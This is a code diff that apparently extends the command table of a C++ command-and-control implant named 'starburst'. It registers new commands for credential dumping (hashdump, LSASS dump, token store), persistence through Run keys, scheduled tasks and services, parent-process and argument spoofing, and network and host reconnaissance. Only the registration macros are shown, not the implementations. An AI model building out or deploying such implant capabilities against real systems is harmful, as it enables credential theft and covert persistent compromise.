@@ -276,6 +276,138 @@ namespace starburst {
   #define CMD_REG_SPAWNTO_X86
 #endif
 
+#ifdef INCLUDE_CMD_SPAWN
+  #define CMD_REG_SPAWN { CMD_SPAWN, cmd_spawn },
+#else
+  #define CMD_REG_SPAWN
+#endif
+
+#ifdef INCLUDE_CMD_ARP
+  #define CMD_REG_ARP { CMD_ARP, cmd_arp },
+#else
+  #define CMD_REG_ARP
+#endif
+
+#ifdef INCLUDE_CMD_DRIVES
+  #define CMD_REG_DRIVES { CMD_DRIVES, cmd_drives },
+#else
+  #define CMD_REG_DRIVES
+#endif
+
+#ifdef INCLUDE_CMD_UPTIME
+  #define CMD_REG_UPTIME { CMD_UPTIME, cmd_uptime },
+#else
+  #define CMD_REG_UPTIME
+#endif
+
+#ifdef INCLUDE_CMD_NET_SESSIONS
+  #define CMD_REG_NET_SESSIONS { CMD_NET_SESSIONS, cmd_net_sessions },
+#else
+  #define CMD_REG_NET_SESSIONS
+#endif
+
+#ifdef INCLUDE_CMD_NET_SHARES
+  #define CMD_REG_NET_SHARES { CMD_NET_SHARES, cmd_net_shares },
+#else
+  #define CMD_REG_NET_SHARES
+#endif
+
+#ifdef INCLUDE_CMD_NET_LOGGEDON
+  #define CMD_REG_NET_LOGGEDON { CMD_NET_LOGGEDON, cmd_net_loggedon },
+#else
+  #define CMD_REG_NET_LOGGEDON
+#endif
+
+#ifdef INCLUDE_CMD_CLIPBOARD
+  #define CMD_REG_CLIPBOARD { CMD_CLIPBOARD, cmd_clipboard },
+#else
+  #define CMD_REG_CLIPBOARD
+#endif
+
+#ifdef INCLUDE_CMD_WINDOWS
+  #define CMD_REG_WINDOWS { CMD_WINDOWS, cmd_windows },
+#else
+  #define CMD_REG_WINDOWS
+#endif
+
+#ifdef INCLUDE_CMD_REG_DELETE
+  #define CMD_REG_REG_DELETE { CMD_REG_DELETE, cmd_reg_delete },
+#else
+  #define CMD_REG_REG_DELETE
+#endif
+
+#ifdef INCLUDE_CMD_REG_CREATE_KEY
+  #define CMD_REG_REG_CREATE_KEY { CMD_REG_CREATE_KEY, cmd_reg_create_key },
+#else
+  #define CMD_REG_REG_CREATE_KEY
+#endif
+
+#ifdef INCLUDE_CMD_PERSIST_RUN
+  #define CMD_REG_PERSIST_RUN { CMD_PERSIST_RUN, cmd_persist_run },
+#else
+  #define CMD_REG_PERSIST_RUN
+#endif
+
+#ifdef INCLUDE_CMD_PERSIST_SCHTASK
+  #define CMD_REG_PERSIST_SCHTASK { CMD_PERSIST_SCHTASK, cmd_persist_schtask },
+#else
+  #define CMD_REG_PERSIST_SCHTASK
+#endif
+
+#ifdef INCLUDE_CMD_PERSIST_SERVICE
+  #define CMD_REG_PERSIST_SERVICE { CMD_PERSIST_SERVICE, cmd_persist_service },
+#else
+  #define CMD_REG_PERSIST_SERVICE
+#endif
+
+#ifdef INCLUDE_CMD_PPID_SPOOF
+  #define CMD_REG_PPID_SPOOF { CMD_PPID_SPOOF, cmd_ppid_spoof },
+#else
+  #define CMD_REG_PPID_SPOOF
+#endif
+
+#ifdef INCLUDE_CMD_ARGUE
+  #define CMD_REG_ARGUE { CMD_ARGUE, cmd_argue },
+#else
+  #define CMD_REG_ARGUE
+#endif
+
+#ifdef INCLUDE_CMD_RUNAS
+  #define CMD_REG_RUNAS { CMD_RUNAS, cmd_runas },
+#else
+  #define CMD_REG_RUNAS
+#endif
+
+#ifdef INCLUDE_CMD_HASHDUMP
+  #define CMD_REG_HASHDUMP { CMD_HASHDUMP, cmd_hashdump },
+#else
+  #define CMD_REG_HASHDUMP
+#endif
+
+#ifdef INCLUDE_CMD_LSASS_DUMP
+  #define CMD_REG_LSASS_DUMP { CMD_LSASS_DUMP, cmd_lsass_dump },
+#else
+  #define CMD_REG_LSASS_DUMP
+#endif
+
+#ifdef INCLUDE_CMD_TOKEN_STORE
+  #define CMD_REG_TOKEN_STORE { CMD_TOKEN_STORE, cmd_token_store },
+#else
+  #define CMD_REG_TOKEN_STORE
+#endif
+
+#ifdef INCLUDE_CMD_PORTSCAN
+  #define CMD_REG_PORTSCAN { CMD_PORTSCAN, cmd_portscan },
+#else
+  #define CMD_REG_PORTSCAN
+#endif
+
+#ifdef INCLUDE_CMD_INLINE_EXECUTE
+  #define CMD_REG_INLINE_EXECUTE { CMD_INLINE_EXECUTE, cmd_inline_execute },
+#else
+  #define CMD_REG_INLINE_EXECUTE
+#endif
+
 #define COMMAND_TABLE_ENTRIES \
     CMD_REG_EXIT              \
     CMD_REG_SLEEP             \
@@ -317,9 +449,31 @@ namespace starburst {
     CMD_REG_REV2SELF          \
     CMD_REG_NET_LOCALGROUP    \
     CMD_REG_NET_LOCALGROUP_MEMBER \
-    CMD_REG_POWERPICK        \
+    CMD_REG_POWERPICK         \
     CMD_REG_SPAWNTO_X64       \
-    CMD_REG_SPAWNTO_X86
+    CMD_REG_SPAWNTO_X86       \
+    CMD_REG_SPAWN             \
+    CMD_REG_ARP               \
+    CMD_REG_DRIVES            \
+    CMD_REG_UPTIME            \
+    CMD_REG_NET_SESSIONS      \
+    CMD_REG_NET_SHARES        \
+    CMD_REG_NET_LOGGEDON      \
+    CMD_REG_CLIPBOARD         \
+    CMD_REG_WINDOWS           \
+    CMD_REG_REG_DELETE        \
+    CMD_REG_REG_CREATE_KEY    \
+    CMD_REG_PERSIST_RUN       \
+    CMD_REG_PERSIST_SCHTASK   \
+    CMD_REG_PERSIST_SERVICE   \
+    CMD_REG_PPID_SPOOF        \
+    CMD_REG_ARGUE             \
+    CMD_REG_RUNAS             \
+    CMD_REG_HASHDUMP          \
+    CMD_REG_LSASS_DUMP        \
+    CMD_REG_TOKEN_STORE       \
+    CMD_REG_PORTSCAN          \
+    CMD_REG_INLINE_EXECUTE
 
 }
 
